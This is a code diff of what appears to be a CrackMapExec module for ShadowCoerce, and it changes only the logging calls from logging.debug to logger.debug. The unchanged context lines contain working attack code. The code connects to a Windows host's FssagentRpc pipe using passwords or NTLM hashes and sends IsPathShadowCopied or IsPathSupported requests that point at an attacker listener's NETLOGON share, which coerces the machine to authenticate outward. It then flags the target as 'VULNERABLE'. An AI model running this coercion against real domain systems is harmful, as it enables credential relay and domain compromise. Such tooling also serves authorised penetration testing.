@@ -40,31 +40,31 @@ class CMEModule:
 
         # If pipe not available, try again. "TL;DR: run the command twice if it doesn't work." - @Shutdown
         if dce == 1:
-            logging.debug("First try failed. Creating another dce connection...")
+            logger.debug("First try failed. Creating another dce connection...")
             # Sleeping mandatory for second try
             time.sleep(2)
             dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe="FssagentRpc")
         
         if self.ipsc: 
-            logging.debug("ipsc = %s", self.ipsc)
-            logging.debug("Using IsPathShadowCopied!")
+            logger.debug("ipsc = %s", self.ipsc)
+            logger.debug("Using IsPathShadowCopied!")
             result = c.IsPathShadowCopied(dce, self.listener)
         else:
-            logging.debug("ipsc = %s", self.ipsc)
-            logging.debug("Using the default IsPathSupported")
+            logger.debug("ipsc = %s", self.ipsc)
+            logger.debug("Using the default IsPathSupported")
             result = c.IsPathSupported(dce, self.listener)
 
         try:
             dce.disconnect()
         except SessionError as e:
-            logging.debug(f"Error disconnecting DCE session: {e}")
+            logger.debug(f"Error disconnecting DCE session: {e}")
 
         if result: 
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/ShutdownRepo/ShadowCoerce")
         
         else:
-            logging.debug("Target not vulnerable to ShadowCoerce")
+            logger.debug("Target not vulnerable to ShadowCoerce")
 
 
 class DCERPCSessionError(DCERPCException):
@@ -160,7 +160,7 @@ class CoerceAuth():
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
             dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-        logging.debug("Connecting to %s" % binding_params[pipe]['stringBinding'])
+        logger.debug("Connecting to %s" % binding_params[pipe]['stringBinding'])
         
         try:
             dce.connect()
@@ -170,20 +170,20 @@ class CoerceAuth():
                 dce.disconnect()
                 return 1
 
-            logging.debug("Something went wrong, check error status => %s" % str(e))            
+            logger.debug("Something went wrong, check error status => %s" % str(e))            
 
-        logging.debug("Connected!")
-        logging.debug("Binding to %s" % binding_params[pipe]['UUID'][0])
+        logger.debug("Connected!")
+        logger.debug("Binding to %s" % binding_params[pipe]['UUID'][0])
         try:
             dce.bind(uuidtup_to_bin(binding_params[pipe]['UUID']))
         except Exception as e:
-            logging.debug("Something went wrong, check error status => %s" % str(e))
+            logger.debug("Something went wrong, check error status => %s" % str(e))
 
-        logging.debug("Successfully bound!")
+        logger.debug("Successfully bound!")
         return dce
 
     def IsPathShadowCopied(self, dce, listener):
-        logging.debug("Sending IsPathShadowCopied!")
+        logger.debug("Sending IsPathShadowCopied!")
         try:
             request = IsPathShadowCopied()
             # only NETLOGON and SYSVOL were detected working here
@@ -192,14 +192,14 @@ class CoerceAuth():
             # request.dump()
             dce.request(request)
         except Exception as e:
-            logging.debug("Something went wrong, check error status => %s", str(e))
-            logging.debug("Attack may of may not have worked, check your listener...")
+            logger.debug("Something went wrong, check error status => %s", str(e))
+            logger.debug("Attack may of may not have worked, check your listener...")
             return False 
 
         return True 
 
     def IsPathSupported(self, dce, listener):
-        logging.debug("Sending IsPathSupported!")
+        logger.debug("Sending IsPathSupported!")
         try:
             request = IsPathSupported()
             # only NETLOGON and SYSVOL were detected working here
@@ -207,8 +207,8 @@ class CoerceAuth():
             request['ShareName'] = '\\\\%s\\NETLOGON\x00' % listener
             dce.request(request)
         except Exception as e:
-            logging.debug("Something went wrong, check error status => %s", str(e))
-            logging.debug("Attack may of may not have worked, check your listener...")
+            logger.debug("Something went wrong, check error status => %s", str(e))
+            logger.debug("Attack may of may not have worked, check your listener...")
             return False 
 
         return True
